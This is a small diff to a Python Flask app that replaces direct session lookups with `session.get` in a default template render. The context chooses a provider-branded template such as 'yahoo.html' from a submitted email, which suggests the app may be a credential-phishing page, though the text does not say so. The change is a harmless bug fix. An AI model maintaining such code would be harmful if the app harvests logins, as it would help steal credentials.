@@ -202,7 +202,7 @@ def route2():
                 return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
     
     # Default template if no valid email is given
-    return render_template('index.html', eman=session['eman'], ins=session['ins'])
+    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
 @app.route("/first", methods=['POST'])
